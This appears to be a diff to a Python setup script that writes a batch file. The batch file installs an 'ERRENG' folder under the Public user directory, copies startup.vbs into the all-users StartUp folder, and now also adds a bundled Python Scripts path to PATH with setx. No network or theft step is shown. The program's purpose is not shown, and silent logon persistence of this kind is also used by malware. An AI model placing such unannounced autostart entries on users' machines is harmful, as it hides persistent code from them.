@@ -19,13 +19,17 @@ dataJson = os.path.join("ERRENG", "data.json")
 """
 
 erreng = drive+os.path.join("Users", "Public", "ERRENG")
+scripts = "C:\\"+os.path.join("Users", "Public", "ERRENG", "wpy", "python-3.12.3.amd64", "Scripts")
 startup = drive+os.path.join("ProgramData", "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
 dataJson = os.path.join("ERRENG", "data.json")
+setx = drive+os.path.join("Windows", "System32", "setx.exe")
 
 setupData = f"""@echo off
 mkdir "{erreng}"
 xcopy /E "ERRENG" "{erreng}" 
-copy "startup.vbs" "{startup}" """
+copy "startup.vbs" "{startup}" 
+{setx} PATH "%PATH%;{scripts}"
+"""
 
 jsonData = {
     "ID": ID,
